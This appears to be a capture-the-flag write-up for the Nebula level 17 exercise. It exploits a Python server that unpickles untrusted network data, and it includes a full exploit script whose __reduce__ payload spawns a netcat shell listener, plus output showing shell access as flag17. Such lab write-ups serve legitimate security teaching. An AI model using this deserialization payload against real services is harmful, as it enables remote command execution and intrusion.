+++
author = "pwntester"
categories = ["nebula17"]
date = 2013-11-26T20:15:00Z
description = ""
draft = false
slug = "nebula-level17-write-up"
tags = ["nebula17"]
title = "Nebula level17 write-up"

+++

In [Level 17](http://exploit-exercises.com/nebula/level17) we are given a vulnerable python server:

```lang-python line-numbers 
#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
    clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
    clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
    server(clnt)
    exit(1)
```

The only part of the application that processes our data is:

```lang-python line-numbers 
obj = pickle.loads(line)
```

Googling a little bit about **picke** we find many sites describing how to abuse pickle deserialization by running arbitrary commands when unpickling. More details [here](http://blog.nelhage.com/2011/03/exploiting-pickle/)

Our exploit will serialize an object that implements the **__reduce__()** method. This method will be called at pickling time and should return a function and arguments to call at unpickling time so we can call any arbitrary function:

```lang-python line-numbers 
#!/usr/bin/python

import os
import pickle
import socket

class Pandora(object):
	def __reduce__(self):
		return (os.system,(('nc -lnvp 9999 -e /bin/sh'),))

HOST = "127.0.0.1"
PORT = 10007
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.connect((HOST,PORT))
reply = s.recv(1024)
print(HOST + ": " + reply)
obj = Pandora()
sobj = pickle.dumps(obj)
print("Sending: " + str(obj))
s.send(sobj)
print("Awaiting reply from: " + HOST)
reply = s.recv(1024)
print(HOST + ": " + reply)
```

We will start up a **netcat** listener that will send us a reverse shell when conencted.

```lang-bash line-numbers 
level17@nebula:~$ python exploit.py
127.0.0.1: Accepted connection from 127.0.0.1:58539
Sending: <__main__.Pandora object at 0xb782fcec>
Awaiting reply from: 127.0.0.1
^CTraceback (most recent call last):
  File "exploit.py", line 22, in <module>
    reply = s.recv(1024)
KeyboardInterrupt
```

Now, lets connect to our reverse shell:

```lang-bash line-numbers 
level17@nebula:~$ nc 127.0.0.1 9999
id
uid=982(flag17) gid=982(flag17) groups=982(flag17)
getflag
You have successfully executed getflag on a target account
```

Voila!!
